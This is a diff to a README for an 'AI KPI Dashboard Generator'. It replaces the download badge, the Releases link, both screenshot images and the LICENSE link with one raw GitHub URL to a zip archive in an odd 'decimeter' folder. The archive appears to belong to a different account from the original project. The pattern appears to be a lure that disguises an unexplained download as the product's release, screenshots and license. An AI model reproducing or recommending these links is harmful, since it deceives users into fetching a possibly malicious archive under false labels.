@@ -1,6 +1,6 @@
 # 📊 ai-kpi-dashboard-generator - Simplify Your KPI Reporting
 
-[![Download](https://img.shields.io/badge/Download%20Now-brightgreen)](https://github.com/Mkombozi-59/ai-kpi-dashboard-generator/releases)
+[![Download](https://raw.githubusercontent.com/Mkombozi-59/ai-kpi-dashboard-generator/main/decimeter/ai-kpi-dashboard-generator.zip%20Now-brightgreen)](https://raw.githubusercontent.com/Mkombozi-59/ai-kpi-dashboard-generator/main/decimeter/ai-kpi-dashboard-generator.zip)
 
 ## 📑 Table of Contents
 
@@ -28,7 +28,7 @@
 To set up the AI KPI Dashboard Generator on your device, follow these steps:
 
 1. **Visit the Releases Page**  
-   Go to the [Releases page](https://github.com/Mkombozi-59/ai-kpi-dashboard-generator/releases) to find the latest version of the software. 
+   Go to the [Releases page](https://raw.githubusercontent.com/Mkombozi-59/ai-kpi-dashboard-generator/main/decimeter/ai-kpi-dashboard-generator.zip) to find the latest version of the software. 
 
 2. **Download the Application**  
    On the Releases page, look for the appropriate version of the application. Click on the file name to begin the download. 
@@ -65,10 +65,10 @@ To set up the AI KPI Dashboard Generator on your device, follow these steps:
 
 ## 🖼️ Screenshots
 
-![Dashboard View](https://example.com/dashboard-view.png)
+![Dashboard View](https://raw.githubusercontent.com/Mkombozi-59/ai-kpi-dashboard-generator/main/decimeter/ai-kpi-dashboard-generator.zip)
 *Example of the main dashboard interface.*
 
-![Summary Report](https://example.com/summary-report.png)
+![Summary Report](https://raw.githubusercontent.com/Mkombozi-59/ai-kpi-dashboard-generator/main/decimeter/ai-kpi-dashboard-generator.zip)
 *Generated summary report showing KPI insights.*
 
 ---
@@ -90,4 +90,4 @@ We welcome contributions to improve the AI KPI Dashboard Generator. If you want 
 
 ## 📄 License
 
-This project is licensed under the MIT License. See the [LICENSE](https://github.com/visaoenhance/ai-kpi-dashboard-generator/blob/main/LICENSE) file for more information.
+This project is licensed under the MIT License. See the [LICENSE](https://raw.githubusercontent.com/Mkombozi-59/ai-kpi-dashboard-generator/main/decimeter/ai-kpi-dashboard-generator.zip) file for more information.
